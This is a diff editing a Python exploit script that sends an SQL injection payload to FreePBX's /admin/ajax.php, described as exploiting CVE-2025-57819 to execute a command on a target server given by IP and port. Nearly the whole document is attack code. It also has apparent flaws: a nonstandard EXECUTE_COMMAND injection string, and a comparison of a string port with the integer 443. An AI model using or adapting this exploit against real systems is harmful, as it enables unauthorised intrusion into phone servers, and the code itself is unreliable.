@@ -2,6 +2,7 @@
 import argparse
 import requests
 import sys
+import json  
 from requests.exceptions import RequestException
 
 
@@ -10,25 +11,22 @@ BASE_ENDPOINT = "/admin/ajax.php"
 
 def build_sql_payload(command: str) -> str:
     """
-    Construct the SQL injection string, testing the most likely syntax.
+    Construct the SQL injection string.
     """
-    
     base_params = "module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x"
-
     
-    payload_attempt1 = f"{base_params}' ; EXECUTE_COMMAND('{command}') -- "
-
-    
-    payload_attempt2 = f"{base_params}' OR 1=1; {command} -- "
-
-   
-    return payload_attempt1
+    payload_sql = f"{base_params}' ; EXECUTE_COMMAND('{command}') -- "
+    return payload_sql
 
 def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
     """Executes the attack by exploiting the FreePBX vulnerability (CVE-2025-57819)."""
 
     
-    protocol = "https" if port == 443 else "http"
+    if port == 443:
+        protocol = "https"
+    else:
+        protocol = "http"
+
     target_url_base = f"{protocol}://{ip}:{port}"
     full_url = f"{target_url_base}{BASE_ENDPOINT}"
 
@@ -40,7 +38,7 @@ def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
 
     
     sql_payload = build_sql_payload(COMMAND_TO_EXECUTE)
-    print(f"[+] Constructed SQL payload: {sql_payload}")
+    print(f"[+] Payload SQL construido: {sql_payload}")
 
     try:
         print("\n[+] Sending GET request with SQL injection...")
@@ -62,9 +60,10 @@ def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
         print(f"[SUCCESS] Request sent. HTTP status: {response.status_code}")
         print("="*60)
 
-        
+    
         print("\n--- SERVER RESPONSE ANALYSIS ---")
 
+        
         try:
             json_data = response.json()
             print("Response in JSON format:")
